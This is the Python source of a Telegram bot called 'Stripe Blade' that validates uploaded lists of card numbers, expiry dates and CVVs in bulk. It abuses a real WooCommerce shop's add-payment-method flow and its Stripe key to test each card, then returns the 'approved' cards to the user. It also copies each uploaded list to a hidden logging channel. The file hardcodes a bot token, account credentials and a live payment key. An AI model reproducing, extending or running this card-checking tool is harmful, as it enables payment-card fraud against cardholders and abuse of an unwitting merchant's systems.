import asyncio
import re
import random
import requests
import os
import functools
import logging
from datetime import datetime
from bs4 import BeautifulSoup
from telegram import InputFile, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler,
    filters
)

# === CONFIG ===
BOT_TOKEN = "7248159727:AAEzc2CNStU6H8F3zD4Y5CFIYRSkyhO_TiQ"
CHANNEL_ID = -1002555306699
GROUP_CHAT_ID = "@sigma6627272"
MESSAGE_ID = 3

EMAIL = "m3hg3c@gmail.com"
PASSWORD = "M3hg123!A"
STRIPE_PK = "pk_live_51J0pV2Ai5aSS7yFafQNdnFVlTHEw2v9DQyCKU4hs0u4R1R3MDes03yCFFeWlp0gEhVavJQQwUAJvQzSC3jSTye8Z00UACjDsfG"

LOGIN_URL = 'https://blackdonkeybeer.com/my-account/'
CHECK_URL = 'https://blackdonkeybeer.com/my-account/add-payment-method/'
AJAX_URL = 'https://blackdonkeybeer.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent'
ORIGIN = 'https://blackdonkeybeer.com'

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Accept': '*/*',
    'Connection': 'keep-alive'
}

combo_data = {}
approved_data = {}

logging.basicConfig(level=logging.INFO)


def parse_combo_line(line):
    patterns = [
        r'^(\d{13,16})\|(\d{2})/(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,16})\|(\d{2})/(\d{2,4})\|(\d{3,4})\|([^|]*)\|([^|]*)\|([^|]*)\|([^|]*)\|([^|]*)\|([^|]*)\|([^|]*)\|([^|]*)\|([^|]*)\|(.+)$'
    ]

    for pattern in patterns:
        match = re.match(pattern, line)
        if match:
            # Return first 4 groups as card info + original line for full combo
            return match.group(1), match.group(2), match.group(3), match.group(4), line
    return None


def fresh_login_session():
    session = requests.Session()
    r = session.get(LOGIN_URL, headers=HEADERS)
    soup = BeautifulSoup(r.text, 'html.parser')
    nonce = soup.find('input', {'name': 'woocommerce-login-nonce'})
    referer = soup.find('input', {'name': '_wp_http_referer'})
    if not nonce or not referer:
        raise Exception("Login page failed to load nonce or referer")
    payload = {
        'username': EMAIL,
        'password': PASSWORD,
        'woocommerce-login-nonce': nonce['value'],
        '_wp_http_referer': referer['value'],
        'login': 'Log in'
    }
    resp = session.post(LOGIN_URL, data=payload, headers=HEADERS)
    if 'customer-logout' not in resp.text:
        raise Exception("Login failed, check credentials")
    return session


def get_ajax_nonce(session):
    resp = session.get(CHECK_URL, headers=HEADERS)
    soup = BeautifulSoup(resp.text, 'html.parser')
    script = soup.find('script', {'id': 'wc-stripe-upe-classic-js-extra'})
    if script and script.string:
        match = re.search(r'"createAndConfirmSetupIntentNonce"\s*:\s*"(\w+)"', script.string)
        if match:
            return match.group(1)
    raise Exception("AJAX nonce not found")


def process_combo(combo):
    try:
        session = fresh_login_session()
        ajax_nonce = get_ajax_nonce(session)
        parsed = parse_combo_line(combo)
        if not parsed:
            return "ERROR", "Invalid combo format", combo
        number, month, year, cvv, full = parsed

        stripe_data = {
            'type': 'card',
            'card[number]': number,
            'card[exp_month]': month,
            'card[exp_year]': year,
            'card[cvc]': cvv,
            'billing_details[address][postal_code]': str(random.randint(10000, 99999)),
            'key': STRIPE_PK,
        }

        stripe_resp = session.post('https://api.stripe.com/v1/payment_methods', headers={
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': HEADERS['User-Agent'],
        }, data=stripe_data)

        stripe_json = stripe_resp.json()
        if 'error' in stripe_json:
            return "DECLINED", stripe_json['error']['message'], full

        payment_method_id = stripe_json['id']
        payload = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': ajax_nonce,
        }

        wc_resp = session.post(AJAX_URL, headers={
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': CHECK_URL,
            'Origin': ORIGIN,
            'User-Agent': HEADERS['User-Agent'],
        }, data=payload)

        json_resp = wc_resp.json()

        # Retry if nonce invalid
        if not json_resp.get('success') and 'Unable to verify your request' in str(json_resp):
            ajax_nonce = get_ajax_nonce(session)
            payload['_ajax_nonce'] = ajax_nonce
            wc_resp = session.post(AJAX_URL, headers={
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': CHECK_URL,
                'Origin': ORIGIN,
                'User-Agent': HEADERS['User-Agent'],
            }, data=payload)
            json_resp = wc_resp.json()

        if json_resp.get('success') and json_resp.get('data', {}).get('status') == 'succeeded':
            return "APPROVED", "Approved", full
        elif json_resp.get('data', {}).get('status') == 'requires_action':
            return "DECLINED", "3DS Secure Required", full
        else:
            return "DECLINED", "Declined", full

    except Exception as e:
        return "ERROR", str(e), combo


async def run_blocking(func, *args):
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, functools.partial(func, *args))


def keyboard():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("▶️ Start Check", callback_data="startcheck"),
            InlineKeyboardButton("📈 View Stats", callback_data="stats")
        ],
        [InlineKeyboardButton("ℹ️ Help & Usage", callback_data="help")]
    ])


async def start(update, context):
    try:
        await context.bot.forward_message(
            chat_id=update.effective_chat.id,
            from_chat_id=GROUP_CHAT_ID,
            message_id=MESSAGE_ID,
            protect_content=True
        )
    except Exception:
        pass

    await update.message.reply_text(
        "✨ Welcome to <b>Stripe Blade</b> — your sleek, private combo validator.\n\n"
        "<b>How to get started:</b>\n"
        "1. Upload your combo list as a <code>.txt</code> file.\n"
        "2. Tap ▶️ <b>Start Check</b> below to begin.\n\n"
        "Use <code>/chk</code> + a card to test one manually.",
        parse_mode="HTML",
        reply_markup=keyboard()
    )


async def upload_file(update, context):
    doc = update.message.document
    chat_id = update.effective_chat.id

    if not doc.file_name.endswith(".txt"):
        await update.message.reply_text("Only .txt files are allowed.")
        return

    file = await doc.get_file()
    raw = await file.download_as_bytearray()
    lines = raw.decode('utf-8', errors='ignore').splitlines()
    combo_data[chat_id] = [line.strip() for line in lines if line.strip()]
    approved_data[chat_id] = []

    await update.message.reply_text(f"✅ Loaded {len(combo_data[chat_id])} combos.")

    # Forward upload to channel for logging (optional)
    await context.bot.copy_message(
        chat_id=CHANNEL_ID,
        from_chat_id=chat_id,
        message_id=update.message.message_id
    )


async def send_approved_file(chat_id, context):
    approved = approved_data.get(chat_id)
    if not approved:
        await context.bot.send_message(chat_id, "No approved cards to export.")
        return

    path = f"approved_{chat_id}.txt"
    with open(path, "w") as f:
        for line in approved:
            f.write(f"{line}\n")

    with open(path, "rb") as f:
        await context.bot.send_document(chat_id, InputFile(f, filename="approved.txt"))
    os.remove(path)


async def button_handler(update, context):
    query = update.callback_query
    await query.answer()

    chat_id = query.message.chat_id

    if query.data == "startcheck":
        if chat_id not in combo_data or not combo_data[chat_id]:
            await query.edit_message_text("Please upload a combo list (.txt) first.")
            return

        await query.edit_message_text("🚀 Starting combo check...\nResults will appear here.")

        stats = {
            'approved': 0,
            'declined': 0,
            'error': 0,
            'total': len(combo_data[chat_id]),
        }

        # Process combos one by one
        for i, combo in enumerate(combo_data[chat_id], 1):
            status, msg, full = await run_blocking(process_combo, combo)
            if status == "APPROVED":
                stats['approved'] += 1
                approved_data[chat_id].append(full)
            elif status == "DECLINED":
                stats['declined'] += 1
            else:
                stats['error'] += 1

            stats['total'] = i

            text = (
                f"Checked: {stats['total']} / {len(combo_data[chat_id])}\n"
                f"✅ Approved: {stats['approved']}\n"
                f"❌ Declined: {stats['declined']}\n"
                f"⚠️ Errors: {stats['error']}"
            )

            # Update the message with stats only
            await query.edit_message_text(text)

        # Send approved results
        await send_approved_file(chat_id, context)

        await query.edit_message_text("✅ Check complete. Approved combos saved and sent.")


async def stats_handler(update, context):
    chat_id = update.effective_chat.id
    approved = approved_data.get(chat_id, [])
    combos = combo_data.get(chat_id, [])
    text = (
        f"📊 Current stats:\n"
        f"Total Combos Loaded: {len(combos)}\n"
        f"Approved: {len(approved)}"
    )
    await update.message.reply_text(text)


async def help_handler(update, context):
    text = (
        "Usage Instructions:\n"
        "- Upload your combos as a .txt file, one combo per line.\n"
        "- Press ▶️ Start Check to begin validating.\n"
        "- Use /chk <card> to check a single card.\n"
        "- Approved combos will be saved and sent after the check.\n"
        "- Contact support if you need help."
    )
    await update.message.reply_text(text)


async def chk_command(update, context):
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /chk <card>")
        return

    combo = " ".join(args).strip()
    await update.message.reply_text("Checking single card...")

    status, msg, full = await run_blocking(process_combo, combo)
    await update.message.reply_text(f"Status: {status}\nMessage: {msg}\nCombo: {full}")


def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("chk", chk_command))
    app.add_handler(CommandHandler("stats", stats_handler))
    app.add_handler(CommandHandler("help", help_handler))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), upload_file))
    app.add_handler(CallbackQueryHandler(button_handler))

    print("Bot started...")
    app.run_polling()

if __name__ == "__main__":
    main()
